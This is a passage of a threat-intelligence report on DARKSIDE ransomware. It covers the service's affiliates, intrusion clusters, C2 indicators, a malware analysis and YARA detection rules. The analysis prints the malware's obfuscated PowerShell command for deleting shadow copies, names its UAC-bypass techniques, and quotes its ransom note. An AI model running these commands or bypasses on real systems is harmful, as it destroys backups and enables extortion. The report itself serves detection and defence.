but this decreases to 10 percent for ransom fees greater than $5 million. In addition to providing builds of DARKSIDE ransomware, the operators of this service also maintain a blog accessible via TOR. The actors use this site to publicize victims in an attempt to pressure these organizations into paying for the non-release of stolen data. A recent update to their underground forum advertisement also indicates that actors may attempt to DDoS victim organizations. The actor darksupp has stated that affiliates are prohibited from targeting hospitals, schools, universities, non-profit organizations, and public sector entities. This may be an effort by the actor(s) to deter law enforcement action, since targeting of these sectors may invite additional scrutiny. Affiliates are also prohibited from targeting organizations in Commonwealth of Independent States (CIS) nations. Advertisement Date/Version Feature/Update Related Reporting Nov. 10, 2020 (V1) Ability to generate builds for both Windows and Linux environments from within the administration panel. 20-00023273 Encrypts files using Salsa20 encryption along with an RSA-1024 public key Access to an administrative panel via TOR that can be used by clients to manage Darkside builds, payments, blog posts, and communication with victims The admin panel includes a Blog section that allows clients to publish victim information and announcements to the Darkside website for the purposes of shaming victims and coercing them to pay ransom demands April 14, 2021 (V2.0) Automated test decryption. The process from encryption to withdrawal of money is automated and no longer relies on support. 21-00008435 Available DDoS of targets (Layer 3, Layer 7) Sought a partner to provide network accesses to them and a person or team with pentesting skills Table 1: Notable features and updates listed on DARKSIDE advertisement thread (exploit.in) DARKSIDE Affiliates DARKSIDE RaaS affiliates are required to pass an interview after which they are provided access to an administration panel (Figure 2). Within this panel, affiliates can perform various actions such as creating a ransomware build, specifying content for the DARKSIDE blog, managing victims, and contacting support. Mandiant has identified at least five Russian-speaking actors who may currently, or have previously, been DARKSIDE affiliates. Relevant advertisements associated with a portion of these threat actors have been aimed at finding either initial access providers or actors capable of deploying ransomware on accesses already obtained. Some actors claiming to use DARKSIDE have also allegedly partnered with other RaaS affiliate programs, including BABUK and SODINOKIBI (aka REvil). For more information on these threat actors, please see Mandiant Advantage . Figure 2: DARKSIDE affiliate panel Attack Lifecycle Mandiant currently tracks five clusters of threat activity that have involved the deployment of DARKSIDE. For more information on uncategorized threats, refer to our post, \" DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors .\" These clusters may represent different affiliates of the DARKSIDE RaaS platform. Throughout observed incidents, the threat actor commonly relied on various publicly available and legitimate tools that are commonly used to facilitate various stages of the attack lifecycle in post-exploitation ransomware attacks (Figure 3). Additional details on three of these UNC groups are included below. Figure 3: TTPs seen throughout DARKSIDE ransomware engagements UNC2628 UNC2628 has been active since at least February 2021. Their intrusions progress relatively quickly with the threat actor typically deploying ransomware in two to three days. We have some evidence that suggests UNC2628 has partnered with other RaaS including SODINOKIBI (REvil) and NETWALKER. In multiple cases we have observed suspicious authentication attempts against corporate VPN infrastructure immediately prior to the start of interactive intrusion operations. The authentication patterns were consistent with a password spraying attack, though available forensic evidence was insufficient to definitively attribute this precursor activity to UNC2628. In cases where evidence was available, the threat actor appeared to obtain initial access through corporate VPN infrastructure using legitimate credentials. UNC2628 has interacted with victim environments using various legitimate accounts, but in multiple cases has also created and used a domain account with the username 'spservice'. Across all known intrusions, UNC2628 has made heavy use of the Cobalt Strike framework and BEACON payloads. BEACON command and control (C2) infrastructure attributed to this actor has included the following: hxxps://104.193.252[.]197:443/ hxxps://162.244.81[.]253:443/ hxxps://185.180.197[.]86:443/ hxxps://athaliaoriginals[.]com/ hxxps://lagrom[.]com:443/font.html hxxps://lagrom[.]com:443/night.html hxxps://lagrom[.]com:443/online.html hxxps://lagrom[.]com:443/send.html hxxps://lagrom[.]com/find.html?key=id#- In at least some cases there is evidence to suggest this actor has employed Mimikatz for credential theft and privilege escalation. The threat actor appeared to have used built-in commands such as ‘net’ and ‘ping’ to perform basic reconnaissance of the internal network, though it is likely that additional reconnaissance was performed via BEACON and not represented in available log sources. UNC2628 has moved laterally in environments almost exclusively via RDP using legitimate credentials and Cobalt Strike BEACON payloads. This threat cluster uses both HTTPS BEACON payloads and SMB BEACON, the latter almost exclusively using named pipes beginning with “\\\\.\\pipe\\UIA_PIPE_” Intrusions attributed to this threat cluster have progressed swiftly from intrusion to data theft and ransomware deployment, and have thus not focused heavily on maintaining a persistent foothold in impacted environments.  Despite this, UNC2628 has maintained access via the collection of legitimate credentials, the creation of attacker-controlled domain accounts (spservice), and via the creation of Windows services intended to launch BEACON. Notably, UNC2628 has repeatedly loaded BEACON with a service named ‘CitrixInit’. UNC2628 has also employed F-Secure Lab s' Custom Command and Control (C3) framework, deploying relays configured to proxy C2 communications through the Slack API. Based on this actor's other TTPs they were likely using C3 to obfuscate Cobalt Strike BEACON traffic. The threat actor has exfiltrated data over SFTP using Rclone to systems in cloud hosting environments. Rclone is a command line utility to manage files for cloud storage applications. Notably, the infrastructure used for data exfiltration has been reused across multiple intrusions. In one case, the data exfiltration occurred on the same day that the intrusion began. UNC2628 deploys DARKSIDE ransomware encryptors using PsExec to a list of hosts contained in multiple text files. The threat actor has used the following directories, placing copies of backdoors, ransomware binaries, copies of PsExec, and lists of victim hosts within them. C:\\run\\ C:\\home\\ C:\\tara\\ C:\\Users\\[username]\\Music\\ C:\\Users\\Public UNC2659 UNC2659 has been active since at least January 2021. We have observed the threat actor move through the whole attack lifecycle in under 10 days. UNC2659 is notable given their use of an exploit in the SonicWall SMA100 SSL VPN product, which has since been patched by SonicWall. The threat actor appeared to download several tools used for various phases of the attack lifecycle directly from those tools’ legitimate public websites. The threat actor obtained initial access to their victim by exploiting CVE-2021-20016 , an exploit in the SonicWall SMA100 SSL VPN product, which has been patched by SonicWall. There is some evidence to suggest the threat actor may have used the vulnerability to disable multi-factor authentication options on the SonicWall VPN, although this has not been confirmed. The threat actor leveraged TeamViewer (TeamViewer_Setup.exe) to establish persistence within the victim environment. Available evidence suggests that the threat actor downloaded TeamViewer directly from the following URL and also browsed for locations from which they could download the AnyDesk utility. hxxps://dl.teamviewer[.]com/download/version_15x/TeamViewer_Setup.exe The threat actor appeared to download the file rclone.exe directly from rclone[.]org - hxxps://downloads.rclone[.]org/v1.54.0/rclone-v1.54.0-windows-amd64.zip. The threat actors were seen using rclone to exfiltrate hundreds of gigabytes of data over the SMB protocol to the pCloud cloud-based hosting and storage service. The threat actor deployed the file power_encryptor.exe in a victim environment, encrypting files and creating ransom notes over the SMB protocol. Mandiant observed the threat actor navigate to ESXi administration interfaces and disable snapshot features prior to the ransomware encryptor deployment, which affected several VM images. UNC2465 UNC2465 activity dates back to at least April 2019 and is characterized by their use of similar TTPs to distribute the PowerShell-based .NET backdoor SMOKEDHAM in victim environments. In one case where DARKSIDE was deployed, there were months-long gaps, with only intermittent activity between the time of initial compromise to ransomware deployment. In some cases, this could indicate that initial access was provided by a separate actor. UNC2465 used phishing emails and legitimate services to deliver the SMOKEDHAM backdoor. SMOKEDHAM is a .NET backdoor that supports keylogging, taking screenshots, and executing arbitrary .NET commands. During one incident, the threat actor appeared to establish a line of communication with the victim before sending a malicious Google Drive link delivering an archive containing an LNK downloader. More recent UNC2465 emails have used Dropbox links with a ZIP archive containing malicious LNK files that, when executed, would ultimately lead to SMOKEDHAM being downloaded onto the system. UNC2465 has used Advanced IP Scanner, BLOODHOUND, and RDP for internal reconnaissance and lateral movement activities within victim environments. The threat actor has used Mimikatz for credential harvesting to escalate privileges in the victim network. UNC2465 also uses the publicly available NGROK utility to bypass firewalls and expose remote desktop service ports, like RDP and WinRM, to the open internet. Mandiant has observed the threat actor using PsExec and cron jobs to deploy the DARKSIDE ransomware. UNC2465 has called the customer support lines of victims and told them that data was stolen and instructed them to follow the link in the ransom note. Implications We believe that threat actors have become more proficient at conducting multifaceted extortion operations and that this success has directly contributed to the rapid increase in the number of high-impact ransomware incidents over the past few years. Ransomware operators have incorporated additional extortion tactics designed to increase the likelihood that victims will acquiesce to paying the ransom prices. As one example, in late April 2021, the DARKSIDE operators released a press release stating that they were targeting organizations listed on the NASDAQ and other stock markets. They indicated that they would be willing to give stock traders information about upcoming leaks in order to allow them potential profits due to stock price drops after an announced breach. In another notable example, an attacker was able to obtain the victim's cyber insurance policy and leveraged this information during the ransom negotiation process refusing to lower the ransom amount given their knowledge of the policy limits. This reinforces that during the post-exploitation phase of ransomware incidents, threat actors can engage in internal reconnaissance and obtain data to increase their negotiating power. We expect that the extortion tactics that threat actors use to pressure victims will continue to evolve throughout 2021. Based on the evidence that DARKSIDE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat. For more comprehensive recommendations for addressing ransomware, please refer to our blog post: \" Ransomware Protection and Containment Strategies: Practical Guidance for Endpoint Protection, Hardening, and Containment \" and the linked white paper . Acknowledgements Beyond the comparatively small number of people who are listed as authors on this report are hundreds of consultants, analysts and reverse-engineers who tirelessly put in the work needed to respond to intrusions at breakneck pace and still maintain unbelievably high analytical standards. This larger group has set the foundation for all of our work, but a smaller group of people contributed more directly to producing this report and we would like to thank them by name. We would like to specifically thank Bryce Abdo and Matthew Dunwoody from our Advanced Practices team and Jay Smith from FLARE, all of whom provided analytical support and technical review. Notable support was also provided by Ioana Teaca, and Muhammadumer Khan. Appendix A: DARKSIDE Ransomware Analysis DARKSIDE is a ransomware written in C that may be configured to encrypt files on fixed and removable disks as well as network shares. DARKSIDE RaaS affiliates are given access to an administration panel on which they create builds for specific victims. The panel allows some degree of customization for each ransomware build such as choosing the encryption mode and whether local disks and network shares should be encrypted (Figures 4). The following malware analysis is based on the file MD5: 1a700f845849e573ab3148daef1a3b0b. A more recently analyzed DARKSIDE sample had the following notable differences: The option for beaconing to a C2 server was disabled and the configuration entry that would have contained a C2 server was removed. Included a persistence mechanism in which the malware creates and launches itself as a service. Contained a set of hard-coded victim credentials that were used to attempt to logon as a local user. If the user token retrieved based on the stolen credentials is an admin token and is part of the domain administrators' group, it is used for network enumeration and file permission access. Figure 4: DARKSIDE build configuration options appearing in the administration panel Host-Based Indicators Persistence Mechanism Early versions of the malware did not contain a persistence mechanism. An external tool or installer was required if the attacker desired persistence. A DARKSIDE version observed in May 2021 implement a persistence mechanism through which the malware creates and launches itself as a service with a service name and description named using eight pseudo-randomly defined lowercase hexadecimal characters (e.g., \".e98fc8f7\") that are also appended by the malware to various other artifacts it created.  This string of characters is referenced as <ransom_ext> . : Service Name: <ransom_ext> Description: <ransom_ext> Filesystem Artifacts Created Files %CD%\\LOG<ransom_ext>.TXT README<ransom_ext>.TXT <original_filename_plus_ext><ransom_ext> May version: %PROGRAMDATA%\\<ransom_ext>.ico Registry Artifacts The DARKSIDE version observed in May sets the following registry key: HKCR\\<ransom_ext>\\DefaultIcon\\<ransom_ext>\\DefaultIcon=%PROGRAMDATA%\\<ransom_ext>.ico Details Configuration The malware initializes a 0x100-byte keystream used to decrypt strings and configuration data. Strings are decrypted as needed and overwritten with NULL bytes after use. The malware's configuration size is 0xBE9 bytes. A portion of the decrypted configuration is shown in Figure 5. 00000000  01 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000070  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 00000080  95 AA A8 7C 2B 6A D5 12 0E 73 B3 7D BD 16 25 62  •ª¨|+jÕ..s³}½.%b 00000090  A4 A8 BF 19 73 F7 E0 BC DF 02 A8 94 32 CF 0C C0  ¤¨¿.s÷à¼ß.¨\"2Ï.À 000000A0  C5 83 0F 14 66 02 87 EE FD 29 96 DF 02 05 C1 12  Åƒ..f.‡îý)–ß..Á. 000000B0  3E 43 A7 59 E1 F0 C4 5D AE E1 20 2E 77 D9 CA 3C  >C§YáðÄ]®á .wÙÊ< 000000C0  AD C6 BC 84 75 1C E7 0B F0 30 2A 51 13 7A B2 66  .Æ¼„u.ç.ð0*Q.z²f 000000D0  44 73 79 E1 E4 69 C3 CA 1B C1 76 63 65 95 EA CA  DsyáäiÃÊ.Ávce•êÊ 000000E0  F6 10 68 0D CE 36 61 F9 57 B9 19 50 31 D4 E1 70  ö.h.Î6aùW¹.P1Ôáp 000000F0  EC 7B 33 1E 4F 17 E1 80 1D BC CF 8C D8 C5 66 41  ì{3.O.á€.¼ÏŒØÅfA 00000100  E5 0A 00 00 02 6E 01 02 15 03 43 01 8E 24 0E 72  å....n....C.Ž$.r <cut> Figure 5: Partial decrypted configuration The sample's 0x80-byte RSA public key blob begins at offset 0x80. The DWORD value at offset 0x100 is multiplied by 64 and an amount of memory equivalent to the result is allocated. The remaining bytes, which start at offset 0x104, are aPLib-decompressed into the allocated buffer. The decompressed bytes include the ransom note and other elements of the malware's configuration described as follows (e.g., processes to terminate, files to ignore). The first 0x60 bytes of the decompressed configuration are shown in Figure 6. 00000000  02 01 01 01 00 01 01 00 01 01 01 01 01 01 01 01  ................ 00000010  01 01 01 01 01 01 24 00 72 00 65 00 63 00 79 00  ......$.r.e.c.y. 00000020  63 00 6C 00 65 00 2E 00 62 00 69 00 6E 00 00 00  c.l.e...b.i.n... 00000030  63 00 6F 00 6E 00 66 00 69 00 67 00 2E 00 6D 00  c.o.n.f.i.g...m. 00000040  73 00 69 00 00 00 24 00 77 00 69 00 6E 00 64 00  s.i...$.w.i.n.d. 00000050  6F 00 77 00 73 00 2E 00 7E 00 62 00 74 00 00 00  o.w.s...~.b.t... <cut> Figure 6: Partial decompressed configuration The first byte from Figure 6 indicates the encryption mode. This sample is configured to encrypt using FAST mode. Supported values are as follows: 1: FULL 2: FAST Other values: AUTO The individual bytes from offset 0x02 to offset 0x15 in Figure 6 are Boolean values that dictate the malware's behavior. The malware takes the actions listed in Table 2 based on these values. Table 2 also identifies features that are enabled or disabled for the current sample. Offset Enabled Description 0x01 Yes Unknown 0x02 Yes Encrypt local disks 0x03 Yes Encrypt network shares 0x04 No Perform language check 0x05 Yes Delete volume shadow copies 0x06 Yes Empty Recycle Bins 0x07 No Self-delete 0x08 Yes Perform UAC bypass if necessary 0x09 Yes Adjust token privileges 0x0A Yes Logging 0x0B Yes Feature not used but results in the following strings being decrypted: https://google.com/api/version https://yahoo.com/v2/api 0x0C Yes Ignore specific folders 0x0D Yes Ignore specific files 0x0E Yes Ignore specific file extensions 0x0F Yes Feature not used; related to these strings: \"backup\" and \"here_backups\" 0x10 Yes Feature not used: related to these strings: \"sql\" and \"sqlite\" 0x11 Yes Terminate processes 0x12 Yes Stop services 0x13 Yes Feature not used; related to a buffer that contains the repeated string \"blah\" 0x14 Yes Drop ransom note 0x15 Yes Create a mutex Table 2: Configuration bits UAC Bypass If the malware does not have elevated privileges, it attempts to perform one of two User Account Control (UAC) bypasses based on the operating system (OS) version. If the OS is older than Windows 10, the malware uses a documented slui.exe file handler hijack technique . This involves setting the registry value HKCU\\Software\\Classes\\exefile\\shell\\open\\command\\Default to the malware path and executing slui.exe using the verb \"runas.\" If the OS version is Windows 10 or newer, the malware attempts a UAC bypass that uses the CMSTPLUA COM interface . The decrypted strings listed in Figure 7 are used to perform this technique. Elevation:Administrator!new: {3E5FC7F9-9A51-4367-9063-A120244FBEC7} Figure 7: Decrypted UAC bypass strings Encryption Setup The malware generates a pseudo-random file extension based on a MAC address on the system. In a DARKSIDE version observed in May 2021, the file extension is generated using a MachineGuid registry value as a seed rather than the MAC address. The file extension consists of eight lowercase hexadecimal characters (e.g., \".e98fc8f7\") and is referred to as <ransom_ext> . The file extension generation algorithm has been recreated in Python . If logging is enabled, the malware creates the log file LOG<ransom_ext>.TXT in its current directory. The malware supports the command line argument \"-path,\" which allows an attacker to specify a directory to target for encryption. The sample analyzed for this report is not configured to perform a system language check. If this functionality were enabled and the check succeeded, the string \"This is a Russian-Speaking System, Exit\" would be written to the log file and the malware would exit. Anti-Recovery Techniques The malware locates and empties Recycle Bins on the system. If the process is running under WOW64, it executes the PowerShell command in Figure 8 using CreateProcess to delete volume shadow copies. powershell -ep bypass -c \"(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F7763 6F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))};iex $s\" Figure 8: Encoded PowerShell command The decoded command from Figure 4 is \"Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}.\" If the malware is not running under WOW64, it uses COM objects and WMI commands to delete volume shadow copies. The decrypted strings in Figure 9 are used to facilitate this process. root/cimv2 SELECT * FROM Win32_ShadowCopy Win32_ShadowCopy.ID='%s' Figure 9: Decrypted strings related to shadow copy deletion System Manipulation Any service the name of which contains one of the strings listed in Figure 10 is stopped and deleted. vss sql svc$ memtas mepocs sophos veeam backup Figure 10: Service-related strings The version observed in May 2021 is additionally configured to stop and delete services containing the strings listed in Figure 11. GxVss GxBlr GxFWD GxCVD GxCIMgr Figure 11: Additional service-related strings in May version Any process name containing one of the strings listed in Figure 12 is terminated. sql oracle ocssd dbsnmp synctime agntsvc isqlplussvc xfssvccon mydesktopservice ocautoupds encsvc firefox tbirdconfig mydesktopqos ocomm dbeng50 sqbcoreservice excel infopath msaccess mspub onenote outlook powerpnt steam thebat thunderbird visio winword wordpad notepad Figure 12: Process-related strings File Encryption Based on its configuration, the malware targets fixed and removable disks as well as network shares. Some processes may be terminated so associated files can be successfully encrypted. However, the malware does not terminate processes listed in Figure 13. vmcompute.exe vmms.exe vmwp.exe svchost.exe TeamViewer.exe explorer.exe Figure 13: Processes not targeted for termination The malware uses the strings listed in Figure 14 to ignore certain directories during the encryption process. windows appdata application data boot google mozilla program files program files (x86) programdata system volume information tor browser windows.old intel msocache perflogs x64dbg public all users default Figure 14: Strings used to ignore directories The files listed in Figure 15 are ignored. $recycle.bin config.msi $windows.~bt $windows.~ws Figure 15: Ignored files The version observed in May 2021 is additionally configured to ignore the files listed in Figure 16. autorun.inf boot.ini bootfont.bin bootsect.bak desktop.ini iconcache.db ntldrntuser.dat ntuser.dat logntuser.ini thumbs.db Figure 16: Additional ignored files in May version Additional files are ignored based on the extensions listed in Figure 17. .386, .adv, .ani, .bat, .bin, .cab, .cmd, .com, .cpl, .cur, .deskthemepack, .diagcab, .diagcfg, .diagpkg, .dll, .drv, .exe, .hlp, .icl, .icns, .ico, .ics, .idx, .ldf, .lnk, .mod, .mpa, .msc, .msp, .msstyles, .msu, .nls, .nomedia, .ocx, .prf, .ps1, .rom, .rtp, .scr, .shs, .spl, .sys, .theme, .themepack, .wpx, .lock, .key, .hta, .msi, .pdb Figure 17: Ignored file extensions Files are encrypted using Salsa20 and a key randomly generated using RtlRandomEx. Each key is encrypted using the embedded RSA-1024 public key. Ransom Note The malware writes the ransom note shown in Figure 18 to README<ransom_ext>.TXT files written to directories it traverses. ----------- [ Welcome to Dark ] -------------> What happend? ---------------------------------------------- Your computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data. But you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network. Follow our instructions below and you will recover all your data. Data leak ---------------------------------------------- First of all we have uploaded more then 100 GB data. Example of data: - Accounting data - Executive data - Sales data - Customer Support data - Marketing data - Quality data - And more other... Your personal leak page: http://darksidedxcftmqa[.]onion/blog/article/id/6/<REDACTED> The data is preloaded and will be automatically published if you do not pay. After publication, your data will be available for at least 6 months on our tor cdn servers. We are ready: - To provide you the evidence of stolen data - To give you universal decrypting tool for all encrypted files. - To delete all the stolen data. What guarantees? ---------------------------------------------- We value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests. All our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems. We guarantee to decrypt one file for free. Go to the site and contact us. How to get access on website? ---------------------------------------------- Using a TOR browser: 1) Download and install TOR browser from this site: https://torproject.org/ 2) Open our website: http://darksidfqzcuhtk2[.]onion/<REDACTED> When you open our website, put the following data in the input form: Key: <REDACTED> !!! DANGER !!! DO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. !!! DANGER !!! Figure 18: Ransom note Decrypted Strings Global\\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://google.com/api/version https://yahoo.com/v2/api sql sqlite $recycle.bin config.msi $windows.~bt $windows.~ws windows appdata application data boot google mozilla program files program files (x86) programdata system volume information tor browser windows.old intel msocache perflogs x64dbg public all users default 386 adv ani bat bin cab cmd com cpl cur deskthemepack diagcab diagcfg diagpkg dll drv exe hlp icl icns ico ics idx ldf lnk mod mpa msc msp msstyles msu nls nomedia ocx prf ps1 rom rtp scr shs spl sys theme themepack wpx lock key hta msi pdb vmcompute.exe vmms.exe vmwp.exe svchost.exe TeamViewer.exe explorer.exe oracle ocssd dbsnmp synctime agntsvc isqlplussvc xfssvccon mydesktopservice ocautoupds encsvc firefox tbirdconfig mydesktopqos ocomm dbeng50 sqbcoreservice excel infopath msaccess mspub onenote outlook powerpnt steam thebat thunderbird visio winword wordpad notepad vss sql svc$ memtas mepocs sophos veeam backup \\r\\nblahblahblahblahblahblahblahblahblahblahblahblahblahblahblahblah\\r\\nblahblahblahblahblahblahbl ahblahblahblahblahblahblahblahblahblah\\r\\nblahblahblahblahblahblahblahblahblahblahblahblahblahblah blahblah\\r\\nblahblahblah\\r\\n \\r\\n----------- [ Welcome to Dark ] ------------->\\r\\n\\r\\nWhat happend?\\r\\n----------------------------------------------\\r\\nYour computers and servers are encrypted, backups are deleted. We use strong encryption algorithms, so you cannot decrypt your data.\\r\\nBut you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your network.\\r\\nFollow our instructions below and you will recover all your data.\\r\\n\\r\\nData leak\\r\\n----------------------------------------------\\r\\nFirst of all we have uploaded more then 100 GB data.\\r\\n\\r\\nExample of data:\\r\\n - Accounting data\\r\\n - Executive data\\r\\n - Sales data\\r\\n - Customer Support data\\r\\n - Marketing data\\r\\n - Quality data\\r\\n - And more other...\\r\\n\\r\\nYour personal leak page: http://darksidedxcftmqa[.]onion/blog/article/id/6/<REDACTED>The data is preloaded and will be automatically published if you do not pay.\\r\\nAfter publication, your data will be available for at least 6 months on our tor cdn servers.\\r\\n\\r\\nWe are ready:\\r\\n- To provide you the evidence of stolen data\\r\\n- To give you universal decrypting tool for all encrypted files.\\r\\n- To delete all the stolen data.\\r\\n\\r\\nWhat guarantees?\\r\\n----------------------------------------------\\r\\nWe value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.\\r\\nAll our decryption software is perfectly tested and will decrypt your data. We will also provide support in case of problems.\\r\\nWe guarantee to decrypt one file for free. Go to the site and contact us.\\r\\n\\r\\nHow to get access on website? \\r\\n----------------------------------------------\\r\\nUsing a TOR browser:\\r\\n1) Download and install TOR browser from this site: https://torproject.org/\\r\\n2) Open our website: http://darksidfqzcuhtk2[.]onion/<REDACTED>\\r\\n\\r\\nWhen you open our website, put the following data in the input form:\\r\\nKey:\\r\\<REDACTED>\\r\\n\\r\\n!!! DANGER !!!\\r\\nDO NOT MODIFY or try to RECOVER any files yourself. We WILL NOT be able to RESTORE them. \\r\\n!!! DANGER !!!\\r\\n -path INF DBG /C DEL /F /Q >> NUL ComSpec README .TXT Start Encrypting Target Folder Encrypt Mode - AUTO Started %u I/O Workers Encrypted %u file(s) Start Encrypt [Handle %u] File Encrypted Successful Encrypt Mode - FAST Encrypt Mode - FULL This is a Russian-Speaking System, Exit System Language Check Encrypting Network Shares Encrypting Local Disks README .TXT Encrypt Mode - AUTO Started %u I/O Workers Encrypted %u file(s) Start Encrypt [Handle %u] File Encrypted Successful Encrypt Mode - FAST Encrypt Mode - FULL Terminating Processes Deleting Shadow Copies Uninstalling Services Emptying Recycle Bin This is a Russian-Speaking System, Exit System Language Check Start Encrypting All Files powershell -ep bypass -c \"(0..61)|%{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F7763 6F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2 *$_,2))};iex $s\" root/cimv2 WQL SELECT * FROM Win32_ShadowCopy ID Win32_ShadowCopy.ID='%s' .exe LOG%s.TXT README%s.TXT Software\\Classes\\exefile\\shell\\open\\command \\slui.exe runas Elevation:Administrator!new: {3E5FC7F9-9A51-4367-9063-A120244FBEC7} explorer.exe Figure 19: Decrypted strings Appendix B: Indicators for Detection and Hunting Yara Detections The following YARA rules are not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives. These rules are intended to serve as a starting point for hunting efforts to identify related activity; however, they may need adjustment over time if the malware family changes. rule Ransomware_Win_DARKSIDE_v1__1 { meta: author = “FireEye” date_created = “2021-03-22” description = “Detection for early versions of DARKSIDE ransomware samples based on the encryption mode configuration values.” md5 = “1a700f845849e573ab3148daef1a3b0b” strings: $consts = { 80 3D [4] 01 [1-10] 03 00 00 00 [1-10] 03 00 00 00 [1-10] 00 00 04 00 [1-10] 00 00 00 00 [1-30] 80 3D [4] 02 [1-10] 03 00 00 00 [1-10] 03 00 00 00 [1-10] FF FF FF FF [1-10] FF FF FF FF [1-30] 03 00 00 00 [1-10] 03 00 00 00 } condition: (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $consts } Figure 20: DARKSIDE YARA rule rule Dropper_Win_Darkside_1 { meta: author = \"FireEye\" date_created = \"2021-05-11\" description = \"Detection for on the binary that was used as the dropper leading to DARKSIDE.\" strings: $CommonDLLs1 = \"KERNEL32.dll\" fullword $CommonDLLs2 = \"USER32.dll\" fullword $CommonDLLs3 = \"ADVAPI32.dll\" fullword $CommonDLLs4 = \"ole32.dll\" fullword $KeyString1 = { 74 79 70 65 3D 22 77 69 6E 33 32 22 20 6E 61 6D 65 3D 22 4D 69 63 72 6F 73 6F 66 74 2E 57 69 6E 64 6F 77 73 2E 43 6F 6D 6D 6F 6E 2D 43 6F 6E 74 72 6F 6C 73 22 20 76 65 72 73 69 6F 6E 3D 22 36 2E 30 2E 30 2E 30 22 20 70 72 6F 63 65 73 73 6F 72 41 72 63 68 69 74 65 63 74 75 72 65 3D 22 78 38 36 22 20 70 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 22 36 35 39 35 62 36 34 31 34 34 63 63 66 31 64 66 22 } $KeyString2 = { 74 79 70 65 3D 22 77 69 6E 33 32 22 20 6E 61 6D 65 3D 22 4D 69 63 72 6F 73 6F 66 74 2E 56 43 39 30 2E 4D 46 43 22 20 76 65 72 73 69 6F 6E 3D 22 39 2E 30 2E 32 31 30 32 32 2E 38 22 20 70 72 6F 63 65 73 73 6F 72 41 72 63 68 69 74 65 63 74 75 72 65 3D 22 78 38 36 22 20 70 75 62 6C 69 63 4B 65 79 54 6F 6B 65 6E 3D 22 31 66 63 38 62 33 62 39 61 31 65 31 38 65 33 62 22 } $Slashes = { 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C 7C } condition: filesize < 2MB and filesize > 500KB and uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (all of ($CommonDLLs*)) and (all of ($KeyString*)) and $Slashes } Figure 21: DARKSIDE Dropper YARA rule rule Backdoor_Win_C3_1 { meta: author = “FireEye” date_created = \"2021-05-11\" description = \"Detection to identify the Custom Command and Control (C3) binaries.\" md5 = \"7cdac4b82a7573ae825e5edb48f80be5\" strings: $dropboxAPI = \"Dropbox-API-Arg\" $knownDLLs1 = \"WINHTTP.dll\" fullword $knownDLLs2 = \"SHLWAPI.dll\" fullword $knownDLLs3 = \"NETAPI32.dll\" fullword $knownDLLs4 = \"ODBC32.dll\" fullword $tokenString1 = { 5B 78 5D 20 65 72 72 6F 72 20 73 65 74 74 69 6E 67 20 74 6F 6B 65 6E } $tokenString2 = { 5B 78 5D 20 65 72 72 6F 72 20 63 72 65 61 74 69 6E 67 20 54 6F 6B 65 6E } $tokenString3 = { 5B 78 5D 20 65 72 72 6F 72 20 64 75 70 6C 69 63 61 74 69 6E 67 20 74 6F 6B 65 6E } condition: filesize < 5MB and uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (((all of ($knownDLLs*)) and ($dropboxAPI or (1 of ($tokenString*)))) or (all of ($tokenString*))) Figure 22: Custom Command and Control (C3) YARA rule Detecting DARKSIDE FireEye products detect this activity at multiple stages of the attack lifecycle. The following table contains specific detections intended to identify and prevent malware and methods seen at these intrusions. For brevity, this list does not include FireEye’s existing detections for BEACON, BloodHound/SharpHound, and other common tools and malware that FireEye has observed both in this campaign and across a broad range of intrusion operations Platform(s) Detection Name Network Security Email Security Detection On Demand Malware Analysis File Protect Ransomware.SSL.DarkSide Trojan.Generic Ransomware.Linux.DARKSIDE Ransomware.Win.Generic.MVX Ransomware.Win.DARKSIDE.MVX Ransomware.Linux.DARKSIDE.MVX Ransomware.Win32.DarkSide.FEC3 FE_Ransomware_Win_DARKSIDE_1 FE_Ransomware_Win32_DARKSIDE_1 FE_Ransomware_Linux64_DARKSIDE_1 FE_Ransomware_Linux_DARKSIDE_1 FEC_Trojan_Win32_Generic_62 FE_Loader_Win32_Generic_177 FE_Loader_Win32_Generic_197 FE_Backdoor_Win_C3_1 FE_Backdoor_Win32_C3_1 FE_Backdoor_Win32_C3_2 FE_Backdoor_Win_C3_2 Backdoor.Win.C3 FE_Dropper_Win_Darkside_1 Endpoint Security Real-Time (IOC) BABYMETAL (BACKDOOR) DARKSIDE RANSOMWARE (FAMILY) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) SUSPICIOUS POWERSHELL USAGE B (METHODOLOGY) Malware Protection(AV/MG) Generic.mg.* Gen:Heur.FKP.17 Gen:Heur.Ransom.RTH.1 